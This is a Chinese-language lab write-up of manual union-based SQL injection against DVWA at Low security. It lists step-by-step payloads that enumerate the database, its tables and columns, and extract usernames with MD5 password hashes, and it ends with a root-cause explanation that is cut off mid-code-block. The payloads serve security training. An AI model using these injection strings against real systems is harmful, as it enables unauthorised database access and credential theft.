# DVWA (Low) SQL注入漏洞完整实战报告

## 🎯 测试目标
- **靶场**: Damn Vulnerable Web Application (DVWA)
- **安全级别**: Low
- **漏洞类型**: SQL注入 (Union-Based)
- **测试目标**: 手动利用SQL注入，获取数据库名、表名及用户凭证。

## 🛠️ 测试环境与工具
- **本地环境**: Windows/Linux + Docker 部署的DVWA
- **主要工具**: 浏览器、Burp Suite Community
- **浏览器插件**: 无

## 🔍 漏洞发现与确认
### 1. 初步探测
**Payload**: `1'`
<img width="1411" height="309" alt="image" src="https://github.com/user-attachments/assets/07d57012-3850-416f-ae58-e85d2ba99966" />

**结果与截图**: 页面返回数据库错误信息，确认存在 SQL 注入点。

### 2. 注入类型确认
**Payload**: `1' AND '1'='1` 与 `1' AND '1'='2`
**结果与截图**: 前者返回正常数据，后者无返回，确认为字符型注入。
<img width="1275" height="390" alt="image" src="https://github.com/user-attachments/assets/ec86d8ff-5561-4d15-a595-4d3a90df5ba4" />

<img width="1644" height="636" alt="image" src="https://github.com/user-attachments/assets/fe46b43f-ccdf-4eb0-bd15-ab7f969bf6b4" />

## 📊 信息收集与利用
### 1. 判断字段数 (ORDER BY)
**Payload**: `1' ORDER BY 3 -- ` `1' ORDER BY 2 -- `

**结果**:  `1' ORDER BY 3 -- `页面报错显示，
<img width="1135" height="195" alt="image" src="https://github.com/user-attachments/assets/9bb90398-4815-40b2-baad-eea4854ad7a2" />

 `1' ORDER BY 2 -- `查询页面正常显示，说明当前查询的字段数为2。
 
 <img width="1770" height="540" alt="image" src="https://github.com/user-attachments/assets/618e63cd-909b-41f8-9b02-2fc2b970fb91" />

**原理**: `ORDER BY` 用于根据指定列排序，当列序号超出实际列数时会报错。

### 2. 确定数据回显点 (UNION SELECT)
**Payload**:1' UNION SELECT 1,2 -- 
<img width="1469" height="670" alt="image" src="https://github.com/user-attachments/assets/53dc071a-ccb1-493b-a09e-bb80b1c6a1ba" />

**结果与截图**：页面同时显示原id=1对应的信息（First name: admin、Surname: admin），以及UNION注入的“1”“2”，说明“First name”“Surname”对应的列是数据回显点。

### 3. 获取数据库信息
**Payload**: 1' UNION SELECT 1,database() -- 
<img width="876" height="390" alt="image" src="https://github.com/user-attachments/assets/aad8f1f3-4054-4da4-9d2a-8ac213e51963" />
**结果**: 当前数据库名为 `dvwa`。

### 4. 获取表名
**Payload**: 1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa' -- 
<img width="1089" height="478" alt="image" src="https://github.com/user-attachments/assets/089c7016-fe8b-43ae-9000-588f0dcd19b4" />

**结果**: 获得表名列表，其中包含关键表 `users`。

### 5. 获取字段名
**Payload**: 1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' -- 
<img width="1175" height="364" alt="image" src="https://github.com/user-attachments/assets/87877beb-3357-4574-9409-ada46c2dc844" />

**结果**: 获得 `users` 表的字段，包括 `user` 和 `password`。

### 6. 提取最终数据
**Payload**: 1' UNION SELECT 1,group_concat(concat(user,':',password)) FROM dvwa.users --
<img width="1801" height="1124" alt="image" src="https://github.com/user-attachments/assets/9c8c9a3f-5cb8-4a3a-a2e8-3869b7a66308" />

**最终结果与截图**: 成功获取所有用户名及MD5哈希密码，以「用户:密码」格式展示。

## 💡 漏洞原理深度分析
- **根本原因**: DVWA在Low级别下，直接将用户输入 `id` 拼接进SQL查询语句，未做任何过滤或参数化处理。
- **关键语句还原**: `SELECT first_name, last_name FROM users WHERE user_id = '$id'`
注入后语句: 当输入 `1' UNION SELECT 1, database() -- ` 时，实际执行的语句变为：
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1, database() -- '
